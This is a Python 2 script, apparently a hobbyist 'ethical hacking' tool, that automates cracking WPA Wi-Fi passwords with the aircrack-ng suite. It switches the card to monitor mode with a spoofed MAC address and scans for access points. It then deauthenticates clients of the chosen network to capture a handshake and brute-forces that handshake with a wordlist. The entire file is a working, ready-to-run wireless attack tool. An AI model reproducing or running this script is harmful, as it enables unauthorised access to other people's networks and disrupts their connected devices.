#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: Ethical H4CK3R
#
import os
import sys
import csv
import time
import argparse
from subprocess import *

class Engine(object):
  def __init__(self,iface,desti='list-01.csv'):
    self.num  = 0
    self.time = 8
    self.mac  = []
    self.ssid = []
    self.chan = [] 
    self.clnt = []
    self.data = []
    self.csv  = desti
    self.wlan = iface
        
  def Monitor(self):
    call(['ifconfig',self.wlan,'down'])
    call(['iwconfig',self.wlan,'mode','monitor'])
    Popen(['macchanger','-r',self.wlan],stdout=Devnull,stderr=Devnull)
    call(['ifconfig',self.wlan,'up'])
    call(['service','network-manager','stop'])

  def Managed(self):
    call(['ifconfig',self.wlan,'down'])
    call(['iwconfig',self.wlan,'mode','managed'])
    Popen(['macchanger','-p',self.wlan],stdout=Devnull,stderr=Devnull)
    call(['ifconfig',self.wlan,'up'])
    call(['service','network-manager','restart'])
    
  def Scan(self):
    cmd = ['airodump-ng','-a','--output-format','csv', '-w','list',self.wlan]
    Popen(cmd,stderr=Devnull,stdout=Devnull)
    time.sleep(self.time)
    call(['pkill','airodump-ng'])
    self.Display()
     
  def Accesspoints(self):
    with open(self.csv, 'r') as AccessPoints:
     Data = csv.reader(AccessPoints,delimiter=',')
     for line in Data:
      if len(line) >= 10:
       chan   = str(line[3]).strip()
       essid  = str(line[13]).strip()
       bssid  = str(line[0]).strip()
       power  = str(line[8]).strip()
       if essid != 'ESSID' and len(essid) and bssid not in self.mac:
        client = 'yes' if bssid in self.clnt else 'no'
        if not len(self.mac):
         call(['clear'])
         data = '#\t Bssid\t\tClient\tPower\tEssid'
         print data
         self.data.append(data)
        data = '{}  {}\t{}\t{}\t{}'.format(self.num,bssid,client,power,essid)
        print data
        time.sleep(.2)
        self.data.append(data)
        self.mac.append(bssid)
        self.ssid.append(essid)
        self.chan.append(chan)
        self.num+=1
  
  def Clients(self):
    with open(self.csv,'r') as Clients:
     Data = csv.reader(Clients,delimiter=',')
     for line in Data:
      if len(line) == 7:
       client = line[5]
       if client[3] == ':' and client not in self.clnt: 
        self.clnt.append(client.strip())
  
  def Display(self):
    self.Clients()
    self.Accesspoints()
    self.Clean('csv')
         
  def Clean(self,end):
    for item in os.listdir('.'):
     if item.endswith('.{}'.format(end)):
      os.remove(item)

  def User(self): 
    if not len(self.data):
     self.Managed()
     exit()
    size=len(self.mac)-1
    call(['clear'])
    for data in self.data:
     print data
    try:
     Index = raw_input('\n[-] Enter a number: ')
     Index = int(Index)
     if Index > size:
      self.User()
     return self.mac[Index],self.ssid[Index],self.chan[Index]
    except KeyboardInterrupt:
     self.Managed()
     exit()

  def Handshake(self,mac,ssid,chan):
    cmd1=['aircrack-ng','{}-01.cap'.format(ssid)]
    cmd2=['aireplay-ng','-0','1','-a',mac,'--ignore-negative-one',self.wlan]
    cmd3=['airodump-ng','--bssid',mac,'--essid',ssid,'-c',chan,'--ignore-negative-one','--output-format','cap','-w','{}'.format(ssid),self.wlan]
    while 1:
     call(['clear'])
     print('[-] Scanning: {}...'.format(ssid)) 
     for i in range(2):
      self.Clean('cap')
      Popen(cmd3,stdout=Devnull,stderr=Devnull)
      time.sleep(self.time)
      Popen(['pkill','airodump-ng'],stdout=Devnull,stderr=Devnull)
      Authen=Popen(cmd1,stderr=PIPE,stdout=PIPE)
      Authen.wait()
      for output in Authen.communicate():
       call(['clear'])
       print('[-] Scanning: {}...'.format(ssid)) 
       if 'Choosing first network as target' in output:
        if '1 handshake' in output:
         return   
       Popen(cmd2,stdout=Devnull,stderr=Devnull).wait()

  def Aircrack(self,handshake,wordlist):
    cmd=['aircrack-ng',handshake,'-w',wordlist]
    Popen(cmd).wait()
       
def Main():
  # Assign Arugments
  UserArgs = argparse.ArgumentParser() 
  UserArgs.add_argument('wordlist',help='path to wordlist')
  UserArgs.add_argument('interface',help='wireless interface')
  Args = UserArgs.parse_args()
 
  # Assign Variables
  cwd = os.getcwd()
  wlan = Args.interface
  engine = Engine(wlan)
  wordlist = str(Args.wordlist)
 
  # Validate Wordlist
  if not os.path.exists(wordlist):
   call(['clear'])
   exit('[!] Unable to locate: {}'.format(wordlist))
  
  # Change Directory 
  os.chdir('/tmp')

  # Enable Monitor Mode
  engine.Monitor()
  call(['clear'])
  print '[-] Scanning ...'

  # Scan For Accesspoints
  while 1:
   try:
    engine.Scan() 
   except KeyboardInterrupt:
    Popen(['pkill','airodump-ng'],stdout=Devnull,stderr=Devnull)
    break
 
  # User 
  Input = engine.User()
  bssid = Input[0]
  essid = Input[1] 
  chan  = Input[2]
  
  # Obtain Handshake
  try:
   engine.Handshake(bssid,essid,chan)
  except KeyboardInterrupt:
   Popen(['pkill','airodump-ng'],stdout=Devnull,stderr=Devnull)
   engine.Managed()
   exit() 
  
  # Disable Monitor Mode
  engine.Managed()
 
  # Full Path To Handshake
  handshake = '{}/{}-01.cap'.format(os.getcwd(),essid)

  # Change Directory
  os.chdir(cwd)
  
  # Start Aircrack
  try:
   engine.Aircrack(handshake,wordlist)
  except KeyboardInterrupt:
   exit()
  
if __name__ =='__main__':
  if os.getuid():
   exit('[!] Root Access Required')
  if sys.platform != 'linux2':
   exit('[!] Kali Linux 2.0 Required')
  Devnull = open(os.devnull, 'w')
  Main()
